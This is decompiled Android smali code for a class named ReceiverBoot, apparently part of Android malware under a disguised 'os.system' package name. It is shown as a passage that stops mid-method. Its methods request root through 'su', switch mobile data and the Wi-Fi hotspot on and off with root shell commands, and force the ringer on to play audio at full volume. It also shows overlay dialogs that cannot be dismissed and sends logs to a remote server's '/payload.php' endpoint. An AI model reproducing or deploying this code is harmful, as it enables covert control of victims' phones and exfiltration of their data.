.class public Los/system/ReceiverBoot;
.super Landroid/content/BroadcastReceiver;
.source "ReceiverBoot.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Los/system/ReceiverBoot$CallWebPageTask;,
        Los/system/ReceiverBoot$ViewKu;
    }
.end annotation


# static fields
.field private static TAG:Ljava/lang/String;

.field public static batStatus:Ljava/lang/String;

.field public static delayToast:I

.field public static docFolder:Ljava/lang/String;

.field public static finishInstall:Z

.field public static flags:[Z

.field public static identitasResult:Ljava/lang/String;

.field public static installResult:Z

.field public static main:Z

.field public static mainSave:Ljava/lang/String;

.field public static pathExternal:Ljava/lang/String;

.field public static pingResult:Z

.field private static prosesThread:Z

.field public static requestAksi:Ljava/lang/String;

.field public static requestPath:Ljava/lang/String;

.field public static requestResult:Ljava/lang/String;

.field public static requestResultUpload:Ljava/lang/String;

.field public static requestUrl:Ljava/lang/String;

.field public static rootResult:Z

.field private static sizedownload:I

.field private static tmpThread:Z

.field private static version:Ljava/lang/String;


# instance fields
.field private audioManager:Landroid/media/AudioManager;

.field public dialog:Landroid/app/AlertDialog;

.field private exContext:Landroid/content/Context;

.field private installator:Los/system/Installer;

.field private mHandler:Landroid/os/Handler;

.field private mRefresh:Ljava/lang/Runnable;

.field private oke:Z

.field private pathToInstallServer:Ljava/lang/String;

.field private seteditor:Landroid/content/SharedPreferences$Editor;

.field private settings:Landroid/content/SharedPreferences;

.field private system:Los/system/SystemThread;

.field public toast:Landroid/widget/Toast;

.field private utils:Los/system/ServerUtils;

.field private vibrator:Landroid/os/Vibrator;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    const/4 v2, 0x1

    const/4 v1, 0x0

    .line 53
    const-string v0, "AsDfGhJ"

    sput-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    .line 61
    const-string v0, "1"

    sput-object v0, Los/system/ReceiverBoot;->version:Ljava/lang/String;

    .line 65
    sput-boolean v2, Los/system/ReceiverBoot;->prosesThread:Z

    .line 66
    sput-boolean v2, Los/system/ReceiverBoot;->tmpThread:Z

    .line 67
    sput v1, Los/system/ReceiverBoot;->sizedownload:I

    .line 70
    sput v1, Los/system/ReceiverBoot;->delayToast:I

    .line 72
    sput-boolean v1, Los/system/ReceiverBoot;->finishInstall:Z

    .line 73
    sput-boolean v1, Los/system/ReceiverBoot;->rootResult:Z

    .line 74
    sput-boolean v1, Los/system/ReceiverBoot;->installResult:Z

    .line 75
    const-string v0, ""

    sput-object v0, Los/system/ReceiverBoot;->identitasResult:Ljava/lang/String;

    .line 76
    sput-boolean v1, Los/system/ReceiverBoot;->pingResult:Z

    .line 77
    const-string v0, ""

    sput-object v0, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 78
    const-string v0, ""

    sput-object v0, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 79
    const-string v0, ""

    sput-object v0, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 80
    const-string v0, ""

    sput-object v0, Los/system/ReceiverBoot;->requestResult:Ljava/lang/String;

    .line 81
    const-string v0, ""

    sput-object v0, Los/system/ReceiverBoot;->requestResultUpload:Ljava/lang/String;

    .line 82
    const-string v0, ""

    sput-object v0, Los/system/ReceiverBoot;->batStatus:Ljava/lang/String;

    .line 83
    sput-boolean v2, Los/system/ReceiverBoot;->main:Z

    .line 84
    const-string v0, ""

    sput-object v0, Los/system/ReceiverBoot;->mainSave:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 51
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 55
    const/4 v0, 0x1

    iput-boolean v0, p0, Los/system/ReceiverBoot;->oke:Z

    .line 87
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Los/system/ReceiverBoot;->mHandler:Landroid/os/Handler;

    .line 89
    new-instance v0, Los/system/ReceiverBoot$1;

    invoke-direct {v0, p0}, Los/system/ReceiverBoot$1;-><init>(Los/system/ReceiverBoot;)V

    iput-object v0, p0, Los/system/ReceiverBoot;->mRefresh:Ljava/lang/Runnable;

    return-void
.end method

.method static synthetic access$000(Los/system/ReceiverBoot;)Ljava/lang/Runnable;
    .locals 1

    .prologue
    .line 51
    iget-object v0, p0, Los/system/ReceiverBoot;->mRefresh:Ljava/lang/Runnable;

    return-object v0
.end method

.method static synthetic access$100(Los/system/ReceiverBoot;)Landroid/os/Handler;
    .locals 1

    .prologue
    .line 51
    iget-object v0, p0, Los/system/ReceiverBoot;->mHandler:Landroid/os/Handler;

    return-object v0
.end method

.method public static cekConnection(Landroid/content/Context;)Z
    .locals 5

    .prologue
    const/4 v2, 0x0

    const/4 v1, 0x1

    .line 414
    const-string v0, "connectivity"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 415
    invoke-virtual {v0, v1}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v3

    .line 416
    invoke-virtual {v0, v2}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v4

    .line 417
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    .line 419
    if-eqz v3, :cond_0

    invoke-virtual {v3}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v3

    if-eqz v3, :cond_0

    move v0, v1

    .line 428
    :goto_0
    return v0

    .line 422
    :cond_0
    if-eqz v4, :cond_1

    invoke-virtual {v4}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v3

    if-eqz v3, :cond_1

    move v0, v1

    .line 423
    goto :goto_0

    .line 425
    :cond_1
    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_2

    move v0, v1

    .line 426
    goto :goto_0

    :cond_2
    move v0, v2

    .line 428
    goto :goto_0
.end method

.method public static cekGsm(Landroid/content/Context;)Z
    .locals 4

    .prologue
    const/4 v1, 0x1

    const/4 v2, 0x0

    .line 432
    const-string v0, "connectivity"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 433
    invoke-virtual {v0, v2}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v3

    .line 434
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    .line 436
    if-eqz v3, :cond_0

    invoke-virtual {v3}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v3

    if-eqz v3, :cond_0

    move v0, v1

    .line 442
    :goto_0
    return v0

    .line 439
    :cond_0
    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_1

    move v0, v1

    .line 440
    goto :goto_0

    :cond_1
    move v0, v2

    .line 442
    goto :goto_0
.end method

.method private extrak(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    .prologue
    const/4 v3, 0x1

    .line 596
    new-instance v0, Los/system/Installer;

    invoke-direct {v0, p1, v3}, Los/system/Installer;-><init>(Landroid/content/Context;Z)V

    .line 597
    const/4 v1, 0x3

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    aput-object p2, v1, v2

    aput-object p3, v1, v3

    const/4 v2, 0x2

    aput-object p4, v1, v2

    invoke-virtual {v0, v1}, Los/system/Installer;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 598
    return-void
.end method

.method private static getExtension(Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 601
    const-string v0, "."

    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 602
    const-string v0, "."

    invoke-virtual {p0, v0}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 604
    :goto_0
    return-object v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public static hostspotStatus(Landroid/content/Context;)Z
    .locals 5

    .prologue
    const/4 v1, 0x0

    .line 464
    const-string v0, "wifi"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/wifi/WifiManager;

    .line 466
    :try_start_0
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    const-string v3, "isWifiApEnabled"

    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Class;

    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    .line 467
    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 468
    const/4 v3, 0x0

    new-array v3, v3, [Ljava/lang/Object;

    invoke-virtual {v2, v0, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    .line 471
    :goto_0
    return v0

    .line 470
    :catch_0
    move-exception v0

    move v0, v1

    .line 471
    goto :goto_0
.end method

.method public static hotspotConfig(Landroid/content/Context;)Z
    .locals 9

    .prologue
    const/4 v1, 0x1

    const/4 v2, 0x0

    .line 475
    const-string v0, "wifi"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/wifi/WifiManager;

    .line 476
    const/4 v3, 0x0

    .line 479
    :try_start_0
    invoke-static {p0}, Los/system/ReceiverBoot;->hostspotStatus(Landroid/content/Context;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 480
    const/4 v4, 0x0

    invoke-virtual {v0, v4}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 481
    const/4 v4, 0x1

    sput-boolean v4, Los/system/ReceiverBoot;->main:Z

    .line 483
    :cond_0
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    const-string v5, "setWifiApEnabled"

    const/4 v6, 0x2

    new-array v6, v6, [Ljava/lang/Class;

    const/4 v7, 0x0

    const-class v8, Landroid/net/wifi/WifiConfiguration;

    aput-object v8, v6, v7

    const/4 v7, 0x1

    sget-object v8, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v7

    invoke-virtual {v4, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    .line 484
    const/4 v5, 0x2

    new-array v5, v5, [Ljava/lang/Object;

    const/4 v6, 0x0

    aput-object v3, v5, v6

    const/4 v6, 0x1

    invoke-static {p0}, Los/system/ReceiverBoot;->hostspotStatus(Landroid/content/Context;)Z

    move-result v3

    if-nez v3, :cond_1

    move v3, v1

    :goto_0
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    aput-object v3, v5, v6

    invoke-virtual {v4, v0, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move v0, v1

    .line 490
    :goto_1
    return v0

    :cond_1
    move v3, v2

    .line 484
    goto :goto_0

    .line 487
    :catch_0
    move-exception v0

    .line 488
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    move v0, v2

    .line 490
    goto :goto_1
.end method

.method private logSend(Landroid/content/Context;Ljava/lang/String;)V
    .locals 6

    .prologue
    const/4 v1, 0x0

    .line 137
    sget-boolean v0, Los/system/ReceiverBoot;->pingResult:Z

    if-eqz v0, :cond_1

    .line 139
    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v2, "HH:mm:ss"

    invoke-direct {v0, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/util/Date;

    invoke-direct {v2}, Ljava/util/Date;-><init>()V

    invoke-virtual {v0, v2}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v2

    .line 140
    const-string v0, ""

    .line 141
    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "["

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, "] "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v3, v1

    .line 143
    :try_start_0
    array-length v4, v3

    :goto_0
    if-ge v1, v4, :cond_0

    aget-object v2, v3, v1

    .line 145
    const-string v5, "UTF-8"

    invoke-static {v2, v5}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v2

    .line 143
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    move-object v0, v2

    goto :goto_0

    .line 147
    :catch_0
    move-exception v1

    .line 149
    :cond_0
    iget-object v1, p0, Los/system/ReceiverBoot;->system:Los/system/SystemThread;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Los/system/ReceiverBoot;->system:Los/system/SystemThread;

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "null"

    invoke-virtual {v1, p1, v0, v2}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 151
    :cond_1
    return-void
.end method

.method public static rootRequest()Ljava/lang/String;
    .locals 8

    .prologue
    const/4 v1, 0x1

    .line 496
    const-string v0, ""

    .line 498
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    const-string v3, "su"

    invoke-virtual {v2, v3}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v2

    .line 499
    new-instance v3, Ljava/io/DataOutputStream;

    invoke-virtual {v2}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 500
    new-instance v4, Ljava/io/DataInputStream;

    invoke-virtual {v2}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v2

    invoke-direct {v4, v2}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    .line 501
    if-eqz v3, :cond_0

    if-eqz v4, :cond_0

    .line 502
    const-string v2, "id\n"

    invoke-virtual {v3, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 503
    invoke-virtual {v3}, Ljava/io/DataOutputStream;->flush()V

    .line 505
    invoke-virtual {v4}, Ljava/io/DataInputStream;->readLine()Ljava/lang/String;

    move-result-object v2

    .line 507
    if-nez v2, :cond_1

    .line 509
    const/4 v0, 0x0

    .line 510
    const-string v1, "tolak user"

    .line 511
    const-string v2, "ROOT"

    const-string v4, "Cant get root access or denied by user"

    invoke-static {v2, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move v7, v0

    move-object v0, v1

    move v1, v7

    .line 525
    :goto_0
    if-eqz v1, :cond_0

    .line 526
    const-string v1, "exit\n"

    invoke-virtual {v3, v1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 527
    invoke-virtual {v3}, Ljava/io/DataOutputStream;->flush()V

    .line 537
    :cond_0
    :goto_1
    return-object v0

    .line 513
    :cond_1
    const-string v4, "uid=0"

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-ne v1, v4, :cond_2

    .line 516
    const-string v0, "root"

    .line 517
    const-string v2, "ROOT"

    const-string v4, "Root access granted"

    invoke-static {v2, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 531
    :catch_0
    move-exception v0

    move-object v1, v0

    .line 533
    const-string v0, "tidak root"

    .line 534
    const-string v2, "ROOT"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Root access rejectd["

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "] :"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    .line 522
    :cond_2
    :try_start_1
    const-string v4, "ROOT"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Root access rejectd: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v4, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0
.end method

.method public static setGSM(ZLandroid/content/Context;)V
    .locals 3

    .prologue
    .line 447
    if-eqz p0, :cond_0

    .line 448
    const-string v0, "svc data enable\n"

    .line 453
    :goto_0
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const-string v2, "su"

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 454
    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 455
    invoke-virtual {v2, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 456
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    .line 458
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 461
    :goto_1
    return-void

    .line 450
    :cond_0
    const-string v0, "svc data disable\n"

    goto :goto_0

    .line 460
    :catch_0
    move-exception v0

    goto :goto_1
.end method


# virtual methods
.method public _server(Landroid/content/Context;)V
    .locals 1

    .prologue
    .line 251
    new-instance v0, Los/system/ServerUtils;

    invoke-direct {v0, p1}, Los/system/ServerUtils;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    .line 252
    return-void
.end method

.method public audio(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    .prologue
    const/high16 v3, 0x42c80000    # 100.0f

    .line 608
    new-instance v1, Landroid/media/MediaPlayer;

    invoke-direct {v1}, Landroid/media/MediaPlayer;-><init>()V

    .line 609
    const-string v0, "audio"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    iput-object v0, p0, Los/system/ReceiverBoot;->audioManager:Landroid/media/AudioManager;

    .line 610
    iget-object v0, p0, Los/system/ReceiverBoot;->audioManager:Landroid/media/AudioManager;

    const/4 v2, 0x2

    invoke-virtual {v0, v2}, Landroid/media/AudioManager;->setRingerMode(I)V

    .line 612
    const-string v0, "start"

    invoke-virtual {p3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 614
    :try_start_0
    invoke-virtual {v1, p2}, Landroid/media/MediaPlayer;->setDataSource(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 617
    :goto_0
    const/4 v0, 0x0

    invoke-virtual {v1, v0}, Landroid/media/MediaPlayer;->setLooping(Z)V

    .line 618
    invoke-virtual {v1, v3, v3}, Landroid/media/MediaPlayer;->setVolume(FF)V

    .line 621
    :try_start_1
    invoke-virtual {v1}, Landroid/media/MediaPlayer;->prepare()V

    .line 622
    invoke-virtual {v1}, Landroid/media/MediaPlayer;->start()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 629
    :goto_1
    return-void

    .line 626
    :cond_0
    invoke-virtual {v1}, Landroid/media/MediaPlayer;->stop()V

    .line 627
    invoke-virtual {v1}, Landroid/media/MediaPlayer;->release()V

    goto :goto_1

    .line 615
    :catch_0
    move-exception v0

    goto :goto_0

    .line 623
    :catch_1
    move-exception v0

    goto :goto_1
.end method

.method public cekClient()Ljava/lang/String;
    .locals 2

    .prologue
    .line 383
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "ls "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/client"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Los/system/ReceiverBoot;->shellCommands(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 384
    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 385
    const-string v0, "kosong"

    .line 388
    :goto_0
    return-object v0

    :cond_0
    const-string v0, "ada"

    goto :goto_0
.end method

.method public cekClientOrServer()Ljava/lang/String;
    .locals 5

    .prologue
    .line 370
    const/4 v0, 0x1

    invoke-static {v0}, Los/system/Identitas;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v0

    .line 371
    const-string v1, "[.]"

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 372
    array-length v1, v0

    add-int/lit8 v1, v1, -0x1

    .line 374
    sget-object v2, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "addres : "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    aget-object v4, v0, v1

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 376
    aget-object v0, v0, v1

    const-string v1, "1"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 377
    const-string v0, "server"

    .line 379
    :goto_0
    return-object v0

    :cond_0
    const-string v0, "client"

    goto :goto_0
.end method

.method public dialogAlert(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    .prologue
    .line 658
    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p1}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 659
    invoke-virtual {v0, p2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    .line 660
    invoke-virtual {v0, p3}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const v1, 0x7f020001

    .line 661
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setIcon(I)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    .line 662
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    iput-object v0, p0, Los/system/ReceiverBoot;->dialog:Landroid/app/AlertDialog;

    .line 663
    iget-object v0, p0, Los/system/ReceiverBoot;->dialog:Landroid/app/AlertDialog;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog;->setCancelable(Z)V

    .line 664
    iget-object v0, p0, Los/system/ReceiverBoot;->dialog:Landroid/app/AlertDialog;

    invoke-virtual {v0}, Landroid/app/AlertDialog;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x7d3

    invoke-virtual {v0, v1}, Landroid/view/Window;->setType(I)V

    .line 665
    iget-object v0, p0, Los/system/ReceiverBoot;->dialog:Landroid/app/AlertDialog;

    invoke-virtual {v0}, Landroid/app/AlertDialog;->show()V

    .line 666
    return-void
.end method

.method public editor(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 3

    .prologue
    .line 589
    new-instance v0, Los/system/Installer;

    const/4 v1, 0x0

    invoke-direct {v0, p1, v1}, Los/system/Installer;-><init>(Landroid/content/Context;Z)V

    .line 591
    :try_start_0
    const-string v0, "utf-8"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

